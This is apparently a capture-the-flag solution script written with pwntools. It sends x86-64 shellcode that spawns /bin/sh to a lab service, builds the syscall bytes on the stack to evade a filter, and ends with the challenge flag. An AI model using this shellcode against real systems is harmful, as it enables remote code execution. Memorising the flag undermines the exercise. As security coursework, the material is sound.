from pwn import *

local = False
elf = 'shellc0de'

if local:
    context.binary = './' + elf
    r = process( './' + elf )
else:
    ip = "sqlab.zongyuan.nctu.me"
    port = 6004
    r = remote(ip, port)	

context.arch = 'amd64'

SHELLCODE = '''
    push    rax
    xor     r8,r8
    mov     r8,0x68732f2f6e69622f
    push    r8
    xor     rax, rax
    mov     al, 59
    xor     rdi, rdi
    mov     rdi, rsp
    xor     rsi, rsi
    xor     rdx, rdx
    
    xor rcx, rcx
    mov cx, 0x40e
    add cx, 0x101
    push cx
    mov R10, rsp
    jmp R10
'''

shellcode = asm(SHELLCODE)

r.recvuntil('>')
r.sendline(shellcode)

r.interactive()

#FLAG{5hellc0d1ng_f0r_5yscal1_:P}
